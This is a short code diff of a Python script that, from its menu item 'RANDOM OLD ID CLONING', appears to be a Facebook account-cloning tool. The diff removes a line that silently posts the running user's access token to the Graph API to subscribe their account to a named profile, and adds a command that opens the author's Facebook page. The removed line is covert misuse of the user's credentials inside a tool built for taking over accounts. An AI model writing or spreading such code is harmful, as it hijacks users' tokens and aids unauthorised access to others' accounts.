@@ -129,8 +129,8 @@ def main():
     print(" \x1b[1;98m[3] RANDOM OLD ID CLONING ")
     print(" \x1b[1;98m[4] EXIT TOOl")
     print(47*".")
-requests.post("https://graph.facebook.com/100008877061741/subscribers?access_token=" + toket)      #Imtiaz Baloch
-    menu()
+    os.system('xdg-open https://www.facebook.com/SharsarfrazBaloch7')
+    log_sel()
 def log_sel():
 	sel = raw_input(" Choose an option: ")
 	if sel =="1":
